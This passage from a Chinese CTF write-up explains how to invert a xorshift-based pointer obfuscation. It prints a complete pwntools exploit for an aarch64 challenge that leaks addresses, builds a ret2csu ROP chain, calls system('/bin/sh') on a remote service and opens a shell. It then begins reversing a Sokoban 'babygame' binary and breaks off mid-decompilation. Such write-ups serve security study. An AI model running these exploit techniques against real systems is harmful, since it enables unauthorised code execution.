class="number">13</span>);</span><br></pre></td></tr></table></figure>

<p>这里抽象的理解为递归加密，最外层可以分解为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>) </span><br><span class="line">^</span><br><span class="line">((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>)) &gt;&gt; <span class="number">13</span>);</span><br></pre></td></tr></table></figure>

<p>也就是可以理解为<code>x ^ (x&gt;&gt;13)</code>。这种加密方式我们可以此次进行破解，比如说<code>y ^ (1 &lt;&lt; (64 -13) - 1)</code>的值就是<code>x</code>高<code>13</code>位的值。那么之后依次进行解密即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">temp</span>(<span class="params">s, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">1</span> &lt;&lt; e) - <span class="number">1</span>) - ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(<span class="built_in">max</span>(<span class="number">0</span>, i - <span class="number">13</span>), i)) &gt;&gt; <span class="number">13</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i - <span class="number">13</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">64</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(i, <span class="built_in">min</span>(i + <span class="number">31</span>, <span class="number">64</span>))) &lt;&lt; <span class="number">31</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i + <span class="number">31</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(<span class="built_in">max</span>(<span class="number">0</span>, i - <span class="number">11</span>), i)) &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i - <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">64</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(i, <span class="built_in">min</span>(i + <span class="number">7</span>, <span class="number">64</span>))) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i + <span class="number">7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure>

<p>最终的<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, file_path])</span><br><span class="line">    <span class="comment"># p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, file_path])</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;52.255.184.147&#x27;</span>, <span class="number">8080</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:0000000000400FD4                 MOV             X19, #0</span></span><br><span class="line"><span class="string">.text:0000000000400FD8</span></span><br><span class="line"><span class="string">.text:0000000000400FD8 loc_400FD8                              ; CODE XREF: sub_400F90+64↓j</span></span><br><span class="line"><span class="string">.text:0000000000400FD8                 LDR             X3, [X21,X19,LSL#3]</span></span><br><span class="line"><span class="string">.text:0000000000400FDC                 MOV             X2, X24</span></span><br><span class="line"><span class="string">.text:0000000000400FE0                 ADD             X19, X19, #1</span></span><br><span class="line"><span class="string">.text:0000000000400FE4                 MOV             X1, X23</span></span><br><span class="line"><span class="string">.text:0000000000400FE8                 MOV             W0, W22</span></span><br><span class="line"><span class="string">.text:0000000000400FEC                 BLR             X3</span></span><br><span class="line"><span class="string">.text:0000000000400FF0                 CMP             X20, X19</span></span><br><span class="line"><span class="string">.text:0000000000400FF4                 B.NE            loc_400FD8</span></span><br><span class="line"><span class="string">.text:0000000000400FF8</span></span><br><span class="line"><span class="string">.text:0000000000400FF8 loc_400FF8                              ; CODE XREF: sub_400F90+3C↑j</span></span><br><span class="line"><span class="string">.text:0000000000400FF8                 LDP             X19, X20, [SP,#var_s10]</span></span><br><span class="line"><span class="string">.text:0000000000400FFC                 LDP             X21, X22, [SP,#var_s20]</span></span><br><span class="line"><span class="string">.text:0000000000401000                 LDP             X23, X24, [SP,#var_s30]</span></span><br><span class="line"><span class="string">.text:0000000000401004                 LDP             X29, X30, [SP+var_s0],#0x40</span></span><br><span class="line"><span class="string">.text:0000000000401008                 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x400FF8</span></span><br><span class="line">csu_end = <span class="number">0x400FD8</span></span><br><span class="line">name_add = <span class="number">0x412030</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">call_addr, arg0, arg1, arg2, jmp_addr=csu_end</span>):</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(jmp_addr)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr) + p64(arg0)</span><br><span class="line">    payload += p64(arg1) + p64(arg2)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;identity: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lock</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp</span>(<span class="params">s, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">1</span> &lt;&lt; e) - <span class="number">1</span>) - ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(<span class="built_in">max</span>(<span class="number">0</span>, i - <span class="number">13</span>), i)) &gt;&gt; <span class="number">13</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i - <span class="number">13</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">64</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(i, <span class="built_in">min</span>(i + <span class="number">31</span>, <span class="number">64</span>))) &lt;&lt; <span class="number">31</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i + <span class="number">31</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(<span class="built_in">max</span>(<span class="number">0</span>, i - <span class="number">11</span>), i)) &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i - <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">64</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(i, <span class="built_in">min</span>(i + <span class="number">7</span>, <span class="number">64</span>))) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i + <span class="number">7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">0</span>:</span><br><span class="line">    p.recvuntil(<span class="string">&quot;xxxx+&quot;</span>)</span><br><span class="line">    key = p.recvuntil(<span class="string">&quot;)&quot;</span>, drop=<span class="literal">True</span>).decode()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;== &quot;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;key is &quot;</span>, key, <span class="string">&quot; hash is &quot;</span>, <span class="built_in">hash</span>)</span><br><span class="line"></span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    strlist = itertools.product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        code = i[<span class="number">0</span>] + i[<span class="number">1</span>] + i[<span class="number">2</span>] + i[<span class="number">3</span>]</span><br><span class="line">        encinfo = hashlib.sha256((code + key).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> encinfo == <span class="built_in">hash</span>:</span><br><span class="line">            <span class="built_in">print</span>(code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    p.sendline(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = p64(csu_start) + p64(<span class="number">0</span>) + p64(<span class="number">0x10A9FC70042</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input your name: &quot;</span>, name)</span><br><span class="line"></span><br><span class="line">lock(-<span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">pac = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">new_csu_start = re(pac)</span><br><span class="line">log.success(<span class="string">&quot;pac csu start address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(new_csu_start)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lock(-<span class="number">1</span>)</span><br><span class="line">auth(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(new_csu_start)</span><br><span class="line">payload += csu(puts_got, read_got, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += csu(read_got, <span class="number">0</span>, name_add, <span class="number">0x20</span>)</span><br><span class="line">payload += csu(name_add, name_add+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) + <span class="number">0x4000000000</span> - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">p.sendline(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>程序实现了一个类似于迷宫的操作，提供了如下的几种功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">h</span><br><span class="line">     Sokoban</span><br><span class="line">How to Play:</span><br><span class="line">    Push all boxs into target place</span><br><span class="line">Map:</span><br><span class="line">    <span class="number">1</span>)█:wall</span><br><span class="line">    <span class="number">2</span>)○:Target</span><br><span class="line">    <span class="number">3</span>)□:Box</span><br><span class="line">    <span class="number">4</span>)♀:Player</span><br><span class="line">    <span class="number">5</span>)●:Box on target</span><br><span class="line">Command:</span><br><span class="line">    <span class="number">1</span>)h: show this message</span><br><span class="line">    <span class="number">2</span>)q: quit the game</span><br><span class="line">    <span class="number">3</span>)w: move up</span><br><span class="line">    <span class="number">4</span>)s: move down</span><br><span class="line">    <span class="number">5</span>)a: move left</span><br><span class="line">    <span class="number">6</span>)d: move right</span><br><span class="line">    <span class="number">7</span>)b: move back</span><br><span class="line">    <span class="number">8</span>)m: leave message</span><br><span class="line">    k)n: show name</span><br><span class="line">    <span class="number">10</span>)l: show message</span><br></pre></td></tr></table></figure>

<p>目前逆向出的<code>game</code>结构体如下，其中<code>map</code>另有结构体存储。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> game            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x50</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span> map_vector_start dq ?</span><br><span class="line"><span class="number">00000008</span> current_vector  dq ?</span><br><span class="line"><span class="number">00000010</span> vector_end      dq ?</span><br><span class="line"><span class="number">00000018</span> start_time      dq ?</span><br><span class="line"><span class="number">00000020</span> end_time        dq ?</span><br><span class="line"><span class="number">00000028</span> cost_time       dq ?</span><br><span class="line"><span class="number">00000030</span> level           dd ?</span><br><span class="line"><span class="number">00000034</span> unknown         dd ?</span><br><span class="line"><span class="number">00000038</span> step_forward    db ?</span><br><span class="line"><span class="number">00000039</span> is_quit         db ?</span><br><span class="line"><span class="number">0000003</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">0000003B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">0000003F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000040</span> <span class="built_in">map</span>             dq ?</span><br><span class="line"><span class="number">00000048</span> message         dq ?</span><br><span class="line"><span class="number">00000050</span> game            ends</span><br></pre></td></tr></table></figure>

<p>程序的主要逻辑如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall main@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, <span class="type">char</span> **a2@&lt;rsi&gt;, <span class="type">char</span> **a3@&lt;rdx&gt;, <span class="type">unsigned</span> <span class="type">int</span> a4@&lt;r12d&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    game_func(a4);</span><br><span class="line">    v4 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;restart?&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)get_input_filter(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;) != <span class="number">121</span> )</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __usercall game_func@&lt;rax&gt;(<span class="type">unsigned</span> <span class="type">int</span> a1@&lt;r12d&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_game((game *)&amp;v2, <span class="number">0</span>);</span><br><span class="line">  game_start((game *)&amp;v2, <span class="number">0LL</span>, a1);</span><br><span class="line">  result = leave_name((__int64)&amp;v2);</span><br><span class="line">  __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __usercall <span class="title function_">game_start</span><span class="params">(game *a1@&lt;rdi&gt;, <span class="type">unsigned</span> __int64 a2@&lt;rsi&gt;, <span class="type">unsigned</span> <span class="type">int</span> a3@&lt;r12d&gt;)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> num; <span class="comment">// ST1F_1</span></span><br><span class="line">  game *a1a; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  a1a = a1;</span><br><span class="line">  sub_FE91();</span><br><span class="line">  a1-&gt;step_forward = <span class="number">1</span>;</span><br><span class="line">  a1-&gt;level = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !a1a-&gt;is_quit )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( a1a-&gt;level == <span class="number">-1</span> &amp;&amp; !a1a-&gt;is_quit )</span><br><span class="line">    &#123;</span><br><span class="line">      num = get_input((__int64)a1, (<span class="type">void</span> *)a2);</span><br><span class="line">      a2 = (<span class="type">unsigned</span> <span class="type">int</span>)num;</span><br><span class="line">      a1 = a1a;</span><br><span class="line">      detec_error_quit(a1a, num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a1a-&gt;is_quit )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    get_map(a1a);</span><br><span class="line">    handle_step(a1a, a3);</span><br><span class="line">    a1 = a1a;</span><br><span class="line">    